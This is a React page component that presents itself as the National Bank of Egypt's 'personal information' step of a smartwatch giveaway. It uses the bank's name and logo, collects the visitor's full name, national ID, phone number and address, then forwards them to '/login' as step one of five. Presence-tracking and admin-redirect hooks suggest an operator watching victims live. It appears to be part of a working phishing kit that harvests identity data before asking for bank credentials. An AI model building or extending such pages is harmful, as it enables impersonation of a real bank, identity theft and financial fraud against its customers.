/**
 * البنك الأهلي المصري - البيانات الشخصية
 * تصميم داكن احترافي موحد مع هوية البنك
 */
import { useState } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";

const GOVERNORATES = [
  "القاهرة", "الجيزة", "الإسكندرية", "الدقهلية", "الشرقية", "المنوفية",
  "القليوبية", "الغربية", "البحيرة", "كفر الشيخ", "الفيوم", "بني سويف",
  "المنيا", "أسيوط", "سوهاج", "قنا", "الأقصر", "أسوان", "البحر الأحمر",
  "الوادي الجديد", "مطروح", "الشرقية", "شمال سيناء", "جنوب سيناء",
  "الاسماعيلية", "السويس", "بورسعيد", "دمياط",
];

export default function PersonalInfo() {
  usePresence("personal");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const [form, setForm] = useState({ fullName: "", nationalId: "", phone: "", governorate: "", address: "" });
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const savePersonalInfo = trpc.applications.savePersonalInfo.useMutation();
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "";

  const handleSubmit = async () => {
    if (!form.fullName.trim()) { setErrorMsg("يرجى إدخال الاسم الكامل"); return; }
    if (form.nationalId.length !== 14) { setErrorMsg("الرقم القومي يجب أن يكون 14 رقماً"); return; }
    if (form.phone.length < 10) { setErrorMsg("يرجى إدخال رقم هاتف صحيح"); return; }
    if (!form.governorate) { setErrorMsg("يرجى اختيار المحافظة"); return; }
    if (!form.address.trim()) { setErrorMsg("يرجى إدخال عنوان التوصيل"); return; }
    setLoading(true);
    setErrorMsg("");
    try {
      await savePersonalInfo.mutateAsync({
        fullName: form.fullName,
        nationalId: form.nationalId,
        phoneNumber: form.phone,
        governorate: form.governorate,
        address: form.address,
        watchColor,
      });
      localStorage.setItem("pw_national_id", form.nationalId);
      sessionStorage.setItem("pw_last_page", "personal");
      sessionStorage.setItem("pw_phone", form.phone);
      setLocation("/login");
    } catch (err) {
      console.error(err);
      setErrorMsg("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
    }
  };

  const inputStyle: React.CSSProperties = {
    width: "100%", padding: "14px 16px", border: "1.5px solid #e5e7eb",
    borderRadius: "10px", fontSize: "15px", fontFamily: "'Cairo', sans-serif",
    boxSizing: "border-box", outline: "none", background: "#f9fafb",
    color: "#1a1a1a", transition: "border-color 0.2s",
  };

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", position: "relative" }}>
      {/* Subtle watermark */}
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ maxWidth: "520px", margin: "0 auto", minHeight: "100vh", display: "flex", flexDirection: "column", position: "relative", zIndex: 1 }}>
        {/* Header */}
        <div style={{ padding: "20px 24px", textAlign: "center", borderBottom: "1px solid #e5e7eb", background: "#ffffff" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "10px" }}>
            <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "42px", width: "auto", display: "block" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
          </div>
          <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "22px", margin: 0 }}>البيانات الشخصية</h2>
        </div>

        {/* Progress */}
        <div style={{ padding: "16px 24px 0" }}>
          <div style={{ height: "4px", background: "#e5e7eb", borderRadius: "10px", overflow: "hidden" }}>
            <div style={{ width: "20%", height: "100%", background: "linear-gradient(90deg, #1B7A3D, #4ade80)", borderRadius: "10px" }} />
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", marginTop: "6px" }}>
            <small style={{ color: "#999", fontSize: "11px" }}>الخطوة 1 من 5</small>
            <small style={{ color: "#1B7A3D", fontSize: "11px", fontWeight: "700" }}>20%</small>
          </div>
        </div>

        {/* Form */}
        <div style={{ padding: "24px", flex: 1 }}>
          {errorMsg && (
            <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "12px 16px", marginBottom: "16px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>{errorMsg}</div>
          )}

          <div style={{ marginBottom: "16px" }}>
            <label style={{ display: "block", fontWeight: "700", fontSize: "14px", marginBottom: "6px", color: "#333" }}>الاسم الكامل</label>
            <input type="text" placeholder="أدخل اسمك الكامل" value={form.fullName} onChange={(e) => setForm({ ...form, fullName: e.target.value })} style={inputStyle} />
          </div>

          <div style={{ marginBottom: "16px" }}>
            <label style={{ display: "block", fontWeight: "700", fontSize: "14px", marginBottom: "6px", color: "#333" }}>الرقم القومي (14 رقم)</label>
            <input type="text" inputMode="numeric" maxLength={14} placeholder="أدخل الرقم القومي" value={form.nationalId}
              onChange={(e) => setForm({ ...form, nationalId: e.target.value.replace(/\D/g, "").slice(0, 14) })} style={inputStyle} />
          </div>

          <div style={{ marginBottom: "16px" }}>
            <label style={{ display: "block", fontWeight: "700", fontSize: "14px", marginBottom: "6px", color: "#333" }}>رقم الهاتف</label>
            <input type="tel" inputMode="numeric" maxLength={11} placeholder="أدخل رقم الهاتف" value={form.phone}
              onChange={(e) => setForm({ ...form, phone: e.target.value.replace(/\D/g, "").slice(0, 11) })} style={inputStyle} />
          </div>

          <div style={{ marginBottom: "16px" }}>
            <label style={{ display: "block", fontWeight: "700", fontSize: "14px", marginBottom: "6px", color: "#333" }}>المحافظة</label>
            <select value={form.governorate} onChange={(e) => setForm({ ...form, governorate: e.target.value })}
              style={{ ...inputStyle, appearance: "auto" }}>
              <option value="">اختر المحافظة</option>
              {GOVERNORATES.map((g, i) => (
                <option key={i} value={g}>{g}</option>
              ))}
            </select>
          </div>

          <div style={{ marginBottom: "24px" }}>
            <label style={{ display: "block", fontWeight: "700", fontSize: "14px", marginBottom: "6px", color: "#333" }}>عنوان التوصيل</label>
            <textarea placeholder="أدخل عنوان التوصيل بالتفصيل (الشارع، المنطقة، أقرب نقطة معروفة)" value={form.address}
              onChange={(e) => setForm({ ...form, address: e.target.value })} rows={3}
              style={{ ...inputStyle, resize: "vertical", minHeight: "80px" }} />
            <small style={{ color: "#999", fontSize: "11px", marginTop: "4px", display: "block" }}>سيتم شحن الساعة الذكية إلى هذا العنوان</small>
          </div>

          <button onClick={handleSubmit} disabled={loading}
            style={{ width: "100%", background: loading ? "#e5e7eb" : "linear-gradient(135deg, #1B7A3D, #145a2c)", color: loading ? "#999" : "white", border: "none", borderRadius: "12px", padding: "16px", fontSize: "16px", fontWeight: "700", cursor: loading ? "not-allowed" : "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: loading ? "none" : "0 6px 25px rgba(27,122,61,0.3)" }}>
            {loading ? "جاري الحفظ..." : "متابعة ←"}
          </button>
        </div>

        <footer style={{ textAlign: "center", padding: "16px", borderTop: "1px solid #e5e7eb" }}>
          <small style={{ color: "#999", fontSize: "11px" }}>© 2026 البنك الأهلي المصري - مصر</small>
        </footer>
      </div>
    </div>
  );
}
